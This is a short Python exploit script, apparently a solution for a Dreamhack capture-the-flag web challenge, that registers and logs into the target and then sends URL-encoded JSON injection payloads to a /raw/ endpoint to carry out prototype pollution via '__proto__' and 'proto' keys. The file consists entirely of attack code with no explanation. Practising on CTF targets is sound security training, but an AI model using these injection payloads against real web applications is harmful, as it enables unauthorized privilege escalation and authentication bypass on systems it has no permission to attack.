import requests

TARGET_URL = 'http://host1.dreamhack.games:21133'

def register():
    data={
        "name":"korea_pocas",
        "id":"test",
        "pw":"test",
        "rpw":"test"
        }
    res = requests.post(f"{TARGET_URL}/register",data=data)
    print(res.text)

def login():
    s = requests.session()
    data={
        "id":"testfq",
        "pw":"test"
        }
    res = s.post(f"{TARGET_URL}/login",data=data,allow_redirects=False)
    print(res.text)
    return s

def debug(s):
    res = s.get(f"{TARGET_URL}/debug")
    print(res.text)
    print(s.cookies)

def pollute(s):
    res = s.get(f"{TARGET_URL}/raw/%22,%22__proto__%22%3a{{%22user%22%3a%22korea_pocas%22}},%22junk%22%3a%22junk")
    print(res.text)

def pollute_login():
    res = requests.get(f"{TARGET_URL}/raw/%22,%22proto%22%3a{{%22id%22%3a%221+1%22}},%22junk%22%3a%22junk")
    print(res.text)

pollute_login()